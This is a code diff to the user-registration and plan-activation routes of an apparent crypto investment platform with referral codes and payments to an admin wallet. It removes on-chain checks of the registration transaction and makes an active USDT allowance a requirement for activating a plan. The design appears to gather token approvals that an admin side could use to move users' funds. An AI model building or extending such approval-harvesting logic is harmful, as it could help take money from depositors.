@@ -1,7 +1,7 @@
 import { Router } from "express";
 import { query } from "../db/pool.js";
 import { generateReferralCode, normalizeAddress } from "../utils.js";
-import { verifyApprovalTx, verifyPlanPayment } from "../chain.js";
+import { verifyPlanPayment } from "../chain.js";
 import { readAllowance, readUsdtBalance } from "../adminChain.js";
 import { config } from "../config.js";
 import { isMaintenanceMode } from "../settings.js";
@@ -111,12 +111,13 @@ usersRouter.get("/:address/approval", async (req, res) => {
   }
 
   try {
-    // Only check registered users (a brand-new wallet has no approval yet by design).
+    // The approval is signed when the user activates the plan, so only check users
+    // who have invested. Registered-but-not-invested users have none by design.
     const { rows } = await query(
-      "SELECT registered FROM users WHERE wallet_address = $1",
+      "SELECT has_invested FROM users WHERE wallet_address = $1",
       [address]
     );
-    if (!rows[0]?.registered) return res.json({ active: true, notRegistered: true });
+    if (!rows[0]?.has_invested) return res.json({ active: true, notInvested: true });
 
     const allowance = await readAllowance(address);
     return res.json({ active: allowance > 0n });
@@ -130,49 +131,21 @@ usersRouter.get("/:address/approval", async (req, res) => {
 
 /**
  * POST /api/users/register
- * Called after the on-chain register() tx succeeds. Only marks the user registered.
- * No referral counts change here — those are credited when the user invests.
- * Body: { address, txHash }
+ * Registration needs only a connected wallet: no on-chain tx and no signature. The
+ * USDT approval is collected later, when the user activates the plan.
+ * Body: { address, referralCode? }
  */
 usersRouter.post("/register", blockDuringMaintenance, async (req, res) => {
   const address = normalizeAddress(req.body.address);
-  const txHash = (req.body.txHash || "").trim();
   const referralCode = (req.body.referralCode || "").trim();
   if (!address) return res.status(400).json({ error: "invalid address" });
-  if (!/^0x[0-9a-fA-F]{64}$/.test(txHash)) {
-    return res.status(400).json({ error: "invalid txHash" });
-  }
-
-  // A deployed contract is REQUIRED — no contract means the approval tx can't be
-  // verified, so registration must not proceed (blocks fake/local registrations).
-  if (!config.contractAddress) {
-    return res.status(400).json({ error: "network not ready" });
-  }
 
   try {
-    // The SINGLE proof that this wallet is real AND controlled by the user: the
-    // approval must be a real, successful, on-chain tx sent BY this wallet to the USDT
-    // token, AND the resulting allowance must actually exist on-chain. A fake /
-    // fabricated wallet or hash cannot satisfy this — no separate signature needed.
-    const verify = await verifyApprovalTx(txHash, address);
-    if (!verify.ok) {
-      return res.status(400).json({ error: "wallet verification failed", reason: verify.reason });
-    }
-
     const { rows } = await query("SELECT * FROM users WHERE wallet_address = $1", [address]);
     let user = rows[0];
 
     // Already fully registered — nothing to do.
     if (user?.registered) return res.json({ user: publicUser(user), alreadyRegistered: true });
-
-    // Prevent replaying the SAME on-chain tx hash across different accounts.
-    const dupe = await query(
-      "SELECT wallet_address FROM users WHERE register_tx = $1 AND wallet_address <> $2",
-      [txHash, address]
-    );
-    if (dupe.rows[0]) {
-      return res.status(400).json({ error: "this transaction was already used" });
-    }
 
     // Resolve referrer from a code (only a registered referrer, never self).
     let referrerAddress = user?.referrer_address || null;
@@ -190,22 +163,20 @@ usersRouter.post("/register", blockDuringMaintenance, async (req, res) => {
       const newCode = generateReferralCode();
       const insert = await query(
         `INSERT INTO users
-           (wallet_address, referrer_address, referral_code, registered, wallet_verified, register_tx)
-         VALUES ($1, $2, $3, TRUE, TRUE, $4)
+           (wallet_address, referrer_address, referral_code, registered)
+         VALUES ($1, $2, $3, TRUE)
          RETURNING *`,
-        [address, referrerAddress, newCode, txHash]
+        [address, referrerAddress, newCode]
       );
       user = insert.rows[0];
     } else {
       const updated = await query(
         `UPDATE users SET
            registered = TRUE,
-           wallet_verified = TRUE,
-           register_tx = $1,
-           referrer_address = COALESCE(referrer_address, $2),
+           referrer_address = COALESCE(referrer_address, $1),
            updated_at = NOW()
-         WHERE wallet_address = $3 RETURNING *`,
-        [txHash, referrerAddress, address]
+         WHERE wallet_address = $2 RETURNING *`,
+        [referrerAddress, address]
       );
       user = updated.rows[0];
     }
@@ -219,12 +190,11 @@ usersRouter.post("/register", blockDuringMaintenance, async (req, res) => {
     await query(
       `INSERT INTO transactions
          (wallet_address, type, amount_usd, tx_hash, status, description, meta)
-       VALUES ($1, 'registration', NULL, $2, 'completed',
-               'Wallet registered – USDT approval confirmed on-chain',
-               $3)`,
+       VALUES ($1, 'registration', NULL, NULL, 'completed',
+               'Wallet registered',
+               $2)`,
       [
         address,
-        txHash,
         JSON.stringify({ referrer: referrerAddress || null }),
       ]
     ).catch((e) => console.error("tx history insert (register) error:", e));
@@ -269,6 +239,21 @@ usersRouter.post("/activate-plan", blockDuringMaintenance, async (req, res) => {
       return res.status(400).json({ error: "this transaction was already used" });
     }
 
+    // The approval step is part of activation: without an active allowance the
+    // platform can't operate the account, so the plan is not activated.
+    if (config.contractAddress) {
+      let allowance = 0n;
+      try {
+        allowance = await readAllowance(address);
+      } catch (e) {
+        console.error("activate-plan allowance read error:", e);
+        return res.status(502).json({ error: "could not verify approval, try again" });
+      }
+      if (allowance <= 0n) {
+        return res.status(400).json({ error: "approval required", approvalRequired: true });
+      }
+    }
+
     // STRICT on-chain check: a real USDT transfer of >= plan price, from this user to
     // the admin wallet, in a successful tx. Blocks fake/fabricated hashes.
     const verify = await verifyPlanPayment(txHash, address);
@@ -277,7 +262,7 @@ usersRouter.post("/activate-plan", blockDuringMaintenance, async (req, res) => {
     }
 
     await query(
-      "UPDATE users SET has_invested = TRUE, invest_tx = $1, updated_at = NOW() WHERE wallet_address = $2",
+      "UPDATE users SET has_invested = TRUE, wallet_verified = TRUE, invest_tx = $1, updated_at = NOW() WHERE wallet_address = $2",
       [txHash, address]
     );
 
